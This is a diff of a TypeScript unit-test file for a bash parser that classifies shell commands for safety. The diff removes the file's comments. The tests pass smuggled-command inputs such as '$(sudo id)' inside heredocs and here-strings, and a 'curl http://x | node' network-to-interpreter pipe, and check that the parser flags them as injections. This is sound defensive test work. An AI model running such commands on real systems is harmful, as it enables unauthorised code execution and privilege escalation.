@@ -1,7 +1,3 @@
-// AST 底座单元矩阵（docs/EXEC-ENV.md §14.2/§14.5-5）：分类闭集穷尽性三锁（真读语法包
-// node-types.json——supertype 过滤 + 计数哨兵 + 恰归一类，grammar 升级加 kind 必红）、
-// 装载失败真接缝、常驻装载冒烟锚、heredoc 双形、赋值/declaration 合成单元、裸重定向宿主。
-
 import { createRequire } from "node:module";
 import { describe, expect, it } from "vitest";
 import { classifyKind, parseBash, parseBashWith } from "../bash/ast.ts";
@@ -13,7 +9,7 @@ describe("分类闭集穷尽性（三锁——防 grammar 漂移 + 防空集恒�
   const visible = nodeTypes.filter((n) => n.named && !n.type.startsWith("_")).map((n) => n.type);
 
   it("锁一：createRequire 解析真实 node-types.json——可见 named kind 非空且计数哨兵=59", () => {
-    expect(visible.length).toBe(59); // 计数哨兵：路径错/JSON 形变 → 0 ≠ 59 红（防空集 every 恒真）
+    expect(visible.length).toBe(59);
   });
   it("锁二：每个可见 kind 恰归一类（未知=undefined 即红）", () => {
     const unclassified = visible.filter((kind) => classifyKind(kind) === undefined);
@@ -21,8 +17,8 @@ describe("分类闭集穷尽性（三锁——防 grammar 漂移 + 防空集恒�
   });
   it("锁三：合成 kind 与 supertype 不在闭集（未知 → unparseable fail-closed）", () => {
     expect(classifyKind("wibble")).toBeUndefined();
-    expect(classifyKind("_statement")).toBeUndefined(); // supertype 运行期不物化——不归类
-    expect(classifyKind("ERROR")).toBeUndefined(); // 内置错误节点由 hasError 前置拦截
+    expect(classifyKind("_statement")).toBeUndefined();
+    expect(classifyKind("ERROR")).toBeUndefined();
   });
 });
 
@@ -49,9 +45,9 @@ describe("heredoc 双形（§14.2 边界 1）", () => {
     expect(parsed.ok).toBe(true);
     if (!parsed.ok) return;
     const cat = parsed.commands.find((c) => c.argv[0] === "cat");
-    expect(cat?.dynamic).toBe(true); // 体会展开——uniform dynamic（含 <<- 盲区）
-    expect(cat?.injection).toBe("command-substitution"); // 体内替换压过 full
-    expect(parsed.commands.some((c) => c.argv[0] === "sudo")).toBe(true); // 内层命令入裁决
+    expect(cat?.dynamic).toBe(true);
+    expect(cat?.injection).toBe("command-substitution");
+    expect(parsed.commands.some((c) => c.argv[0] === "sudo")).toBe(true);
   });
   it("引号定界：纯字面——体不裁决不标记（放宽回归锚）", () => {
     const parsed = parseBash("cat <<'EOF'\nsudo id\nEOF");
@@ -59,7 +55,7 @@ describe("heredoc 双形（§14.2 边界 1）", () => {
     if (!parsed.ok) return;
     const cat = parsed.commands.find((c) => c.argv[0] === "cat");
     expect(cat?.dynamic).toBe(false);
-    expect(parsed.commands.some((c) => c.argv[0] === "sudo")).toBe(false); // 体行不再是命令
+    expect(parsed.commands.some((c) => c.argv[0] === "sudo")).toBe(false);
   });
   it("<<- tab 形：AST 体节点为空的盲区——注入由节点全文兜底扫描补（内层命令不可收集，执法=注入标记）", () => {
     const parsed = parseBash("cat <<-EOF\n\t$(sudo id)\nEOF");
@@ -67,7 +63,7 @@ describe("heredoc 双形（§14.2 边界 1）", () => {
     if (!parsed.ok) return;
     const cat = parsed.commands.find((c) => c.argv[0] === "cat");
     expect(cat?.dynamic).toBe(true);
-    expect(cat?.injection).toBe("command-substitution"); // full 档也被压制——盲区不得放行
+    expect(cat?.injection).toBe("command-substitution");
   });
 });
 
@@ -159,11 +155,11 @@ describe("覆盖补测（§14.6 覆盖率预算——真实形态补齐未达分
   });
   it("here-string：`cmd <<< word` 无文件目标；`cmd <<< \"$(sudo id)\"` 展开标记 + 递归", () => {
     const plain = parseBash("cmd <<< word");
-    expect(plain.ok && plain.commands[0]?.redirects).toEqual([{ face: "input", op: "<<<", target: undefined }]); // stdin 判定面记录（无目标不裁决）
+    expect(plain.ok && plain.commands[0]?.redirects).toEqual([{ face: "input", op: "<<<", target: undefined }]);
     const expand = parseBash('cmd <<< "$(sudo id)"');
     expect(expand.ok).toBe(true);
     if (!expand.ok) return;
-    const cmd = expand.commands.find((c) => c.argv[0] === "cmd"); // 内层命令先入列
+    const cmd = expand.commands.find((c) => c.argv[0] === "cmd");
     expect(cmd?.dynamic).toBe(true);
     expect(cmd?.injection).toBe("command-substitution");
     expect(expand.commands.some((c) => c.argv[0] === "sudo")).toBe(true);
@@ -199,7 +195,7 @@ describe("覆盖补测（§14.6 覆盖率预算——真实形态补齐未达分
       }
     };
     const parsed = parseBashWith("> f", () => ({ Parser: fakeParser, Bash: {} }));
-    expect(parsed.ok ? parsed.commands.map((c) => c.argv) : [["FAIL"]]).toEqual([["id"], []]); // procsub 内层命令 + 语句位替换合成单元——删防御分支即红
+    expect(parsed.ok ? parsed.commands.map((c) => c.argv) : [["FAIL"]]).toEqual([["id"], []]);
   });
 });
 
@@ -217,7 +213,7 @@ describe("覆盖补测二（分支余量——裸重定向管道与 payload 尾�
     const parsed = parseBash("> a | > b");
     expect(parsed.ok).toBe(true);
     if (!parsed.ok) return;
-    expect(parsed.commands.every((c) => c.argv.length === 0)).toBe(true); // 两个纯重定向宿主
+    expect(parsed.commands.every((c) => c.argv.length === 0)).toBe(true);
     expect(parsed.commands.every((c) => c.injection === undefined)).toBe(true);
   });
 });
@@ -229,10 +225,10 @@ describe("B-bug-7 回归：管道喂解释器按解释器族判定（net-pipe/ba
       if (!parsed.ok) throw new Error(`unparseable: ${src}`);
       const flagged = parsed.commands.some((cmd) => cmd.injection !== undefined || cmd.stdinFed === true);
       const last = parsed.commands.at(-1);
-      expect(flagged || last?.opaque !== undefined || last?.ask !== undefined, src).toBe(true); // 注入或 opaque 兜底——绝不再静默 readonly
+      expect(flagged || last?.opaque !== undefined || last?.ask !== undefined, src).toBe(true);
     }
     const inj = parseBash("curl http://x | node");
     if (!inj.ok) throw new Error("unparseable");
-    expect(inj.commands.some((cmd) => cmd.injection === "net-pipe-shell")).toBe(true); // 命中注入类（拒记）
+    expect(inj.commands.some((cmd) => cmd.injection === "net-pipe-shell")).toBe(true);
   });
 });
